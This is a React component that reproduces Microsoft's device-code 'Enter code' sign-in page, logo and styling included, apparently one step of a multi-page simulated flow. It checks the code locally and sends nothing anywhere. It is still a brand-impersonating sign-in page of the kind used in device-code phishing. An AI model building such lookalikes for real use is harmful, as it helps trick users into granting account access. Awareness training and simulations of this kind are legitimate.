"use client";

import { useState } from "react";

interface Props {
  onSuccess: () => void;
  validCode: string;
  expiredCode: string;
}

// Microsoft logo
function MicrosoftLogo({ size = 20 }: { size?: number }) {
  const half = size / 2 - 1;
  return (
    <svg width={size} height={size} viewBox="0 0 21 21" fill="none">
      <rect x="0" y="0" width={half} height={half} fill="#f25022" />
      <rect x={half + 2} y="0" width={half} height={half} fill="#7fba00" />
      <rect x="0" y={half + 2} width={half} height={half} fill="#00a4ef" />
      <rect x={half + 2} y={half + 2} width={half} height={half} fill="#ffb900" />
    </svg>
  );
}

export default function Page4Code({ onSuccess, validCode, expiredCode }: Props) {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [inputFocused, setInputFocused] = useState(false);

  const handleNext = () => {
    const trimmed = code.trim().toUpperCase();
    if (!trimmed) return;

    setSubmitting(true);
    setError("");

    setTimeout(() => {
      if (trimmed === validCode) {
        setSuccess(true);
        setTimeout(() => {
          onSuccess();
        }, 1200);
      } else {
        setError("That code didn't work. Check the code and try again.");
        setSubmitting(false);
      }
    }, 800);
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") handleNext();
  };

  return (
    <div className="min-h-screen bg-white flex flex-col page-transition">
      <div className="flex-1 flex flex-col w-full max-w-[440px] mx-auto px-6 py-8 sm:py-12">
        {/* Microsoft Logo */}
        <div className="mb-8">
          <MicrosoftLogo size={24} />
        </div>

        {/* Success state */}
        {success ? (
          <div className="flex-1 flex flex-col items-center justify-center animate-fade-in">
            <div className="w-16 h-16 rounded-full bg-[#107c10] flex items-center justify-center mb-4 shadow-lg">
              <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
                <path
                  className="check-draw"
                  d="M7 16l6 6 12-12"
                  stroke="white"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            </div>
            <div className="text-[20px] font-semibold text-gray-800 text-center mb-2">
              Verification successful
            </div>
            <div className="flex items-center gap-2 mt-4">
              <div className="spinner-blue" />
              <span className="text-[13px] text-gray-400">Loading...</span>
            </div>
          </div>
        ) : (
          <>
            {/* Heading */}
            <h1 className="text-[26px] font-semibold text-gray-900 mb-3">
              Enter code
            </h1>

            {/* Description */}
            <p className="text-[15px] text-gray-700 mb-6 leading-relaxed">
              Enter the code displayed on your device.
            </p>

            {/* Code input */}
            <div className="mb-8">
              <input
                id="code-input"
                type="text"
                value={code}
                onChange={(e) => {
                  setCode(e.target.value);
                  setError("");
                }}
                onFocus={() => setInputFocused(true)}
                onBlur={() => setInputFocused(false)}
                onKeyDown={handleKeyDown}
                placeholder="Code"
                autoComplete="off"
                className={`w-full border-b border-t-0 border-l-0 border-r-0 outline-none text-[18px] text-gray-800 py-2 bg-transparent placeholder-gray-400 tracking-widest transition-all ${
                  error
                    ? "border-red-600"
                    : inputFocused
                    ? "border-[#0067b8]"
                    : "border-black"
                }`}
              />
              {error && (
                <p className="text-[13px] text-red-600 mt-2 animate-fade-in">{error}</p>
              )}
            </div>

            {/* Links */}
            <div className="mb-8">
              <a href="#" className="text-[13px] text-[#0067b8] hover:underline" onClick={e => e.preventDefault()}>
                Privacy Statement
              </a>
            </div>

            {/* Next button */}
            <div className="flex justify-end">
              <button
                onClick={handleNext}
                disabled={submitting || !code.trim()}
                className="px-8 py-1.5 bg-[#0067b8] text-white rounded-sm font-normal text-[15px] hover:bg-[#005da6] active:bg-[#005293] transition-colors disabled:opacity-50"
              >
                {submitting ? "Processing..." : "Next"}
              </button>
            </div>
          </>
        )}
      </div>

      {/* Footer */}
      <div className="mt-auto px-6 py-4 w-full bg-[#f2f2f2] sm:bg-transparent">
        <div className="flex justify-end gap-4 text-[12px] text-gray-600 max-w-[440px] mx-auto w-full">
          <a href="#" className="hover:underline" onClick={(e) => e.preventDefault()}>Terms of use</a>
          <a href="#" className="hover:underline" onClick={(e) => e.preventDefault()}>Privacy &amp; cookies</a>
          <span>· · ·</span>
        </div>
      </div>
    </div>
  );
}
